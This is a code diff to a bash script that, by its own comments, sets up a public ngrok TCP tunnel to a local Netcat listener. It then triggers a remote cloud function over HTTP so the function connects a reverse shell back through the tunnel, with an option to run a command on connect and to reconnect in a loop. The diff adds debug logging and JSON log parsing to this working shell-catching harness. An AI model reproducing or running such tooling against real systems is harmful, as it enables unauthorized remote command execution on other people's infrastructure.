@@ -17,6 +17,11 @@ set -m
 TMP_SUBDIR="/tmp/$(uuidgen)"
 mkdir "$TMP_SUBDIR"
 
+NGROK_LOG_FILE="$TMP_SUBDIR/ngrok_output.json"
+touch "$NGROK_LOG_FILE"
+
+CURL_OUTPUT_FILE="$TMP_SUBDIR/curl_output.txt"
+
 cleanup () {
     rm -r "$TMP_SUBDIR"
     kill $(jobs -p) 2>/dev/null;
@@ -67,6 +72,11 @@ do
         shift
         ;;
 
+        -d|--debug)
+        DEBUG="$value"
+        shift
+        ;;
+
         -*|--*=) # unsupported flags
         echo "Error: Unsupported flag $key" >&2
         exit 1
@@ -82,31 +92,40 @@ LISTENER_PORT="${LISTENER_PORT:-4444}"
 
 if [[ -z "$URL" ]]
 then
-    echo 'usage: cheetah/cougar/panther [--url/-u FUNCTION_URL] [--api-key/-a API_KEY] [--port/-p LISTENER_PORT_DEFAULT_4444] [--command/-c SINGLE_COMMAND_TO_RUN_ON_CONNECT] [--loop/-l TRUE_TO_RECONNECT_ON_TIMEOUT]'
-    echo 'See script/USAGE.md for more details.'
+    echo "usage: cheetah/cougar/panther [--url/-u FUNCTION_URL] [--api-key/-a API_KEY] [--port/-p LISTENER_PORT_DEFAULT_4444] [--command/-c SINGLE_COMMAND_TO_RUN_ON_CONNECT] [--loop/-l TRUE_TO_RECONNECT_ON_TIMEOUT]"
+    echo "See script/USAGE.md for more details."
     exit 1
 fi
 
 # Run ngrok and derive the public-facing host and port it is using.
-ngrok tcp "$LISTENER_PORT" --log stdout > "$TMP_SUBDIR/ngrok_output.txt" 2>&1 &
+ngrok tcp "$LISTENER_PORT" --log stdout --log-format json > "$NGROK_LOG_FILE" &
 sleep 3
 
 if ! [[ -n $(pgrep ngrok) ]]
 then
     echo "Error: ngrok failed to start properly."
+
+    if ! [[ -z "$DEBUG" ]]
+    then
+        cat "$NGROK_LOG_FILE"
+    fi
+
     exit 1
 fi
 
-NGROK_HOST_AND_PORT=$(cat "$TMP_SUBDIR/ngrok_output.txt" | grep url | awk '{print $8}' | awk 'BEGIN { FS="url=tcp://" }; { print $2 }')
+NGROK_HOST_AND_PORT=$(cat "$NGROK_LOG_FILE" | jq -r 'select(.msg == "started tunnel").url' | awk 'BEGIN { FS="tcp://" }; { print $2 }')
 NGROK_HOST=$(echo $NGROK_HOST_AND_PORT | awk 'BEGIN { FS=":" }; { print $1 }')
 NGROK_PORT=$(echo $NGROK_HOST_AND_PORT | awk 'BEGIN { FS=":" }; { print $2 }')
 
 if [[ -z $NGROK_HOST || -z $NGROK_PORT ]]
 then
-    echo "Error: Failed to get host or port from ngrok."
-    echo "NGROK Output: $TMP_SUBDIR/ngrok_output.txt"
-    cat $TMP_SUBDIR/ngrok_output.txt
-    echo "NGROK Host: $NGROK_HOST_AND_PORT"
+    echo "Error: Failed to get host or port from ngrok. Host: $NGROK_HOST_AND_PORT"
+
+    if ! [[ -z "$DEBUG" ]]
+    then
+        cat "$NGROK_LOG_FILE"
+    fi
+
     exit 1
 fi
 
@@ -140,17 +159,22 @@ do
     fi
 
     # Invoke the function with an HTTP call, connecting the reverse shell to the Netcat listener.
-    curl -s -H "$HEADER" "$URL" > "$TMP_SUBDIR/curl_output.txt" &
+    curl -s -H "$HEADER" "$URL" > "$CURL_OUTPUT_FILE" &
 
     # Note: This might be an insufficient amount of time to wait for functions with cold starts.
     # TODO: Investigate better error checking methods.
     sleep 1
 
     # Exit if the curl request terminated already.
-    if [[ -s "$TMP_SUBDIR/curl_output.txt" ]]
+    if [[ -s "$CURL_OUTPUT_FILE" ]]
     then
-        printf "Error: "
-        cat "$TMP_SUBDIR/curl_output.txt"
+        echo "Error: curl command prematurely terminated."
+
+        if ! [[ -z "$DEBUG" ]]
+        then
+            cat "$CURL_OUTPUT_FILE"
+        fi
+
         exit 1
     fi
 
@@ -158,6 +182,12 @@ do
     if ! [[ -n $(pgrep curl) ]]
     then
         echo "Error: curl command failed."
+
+        if ! [[ -z "$DEBUG" ]]
+        then
+            cat "$CURL_OUTPUT_FILE"
+        fi
+
         exit 1
     fi
 
@@ -178,12 +208,12 @@ do
     fi
 
     echo
-    echo 'Connection terminated.'
+    echo "Connection terminated."
     JOB=$(($JOB + 2))
 
     if ! [[ -z "$LOOP" ]]
     then
-        rm "$TMP_SUBDIR/curl_output.txt"
-        echo 'Restarting...'
+        rm "$CURL_OUTPUT_FILE"
+        echo "Restarting..."
     fi
 done
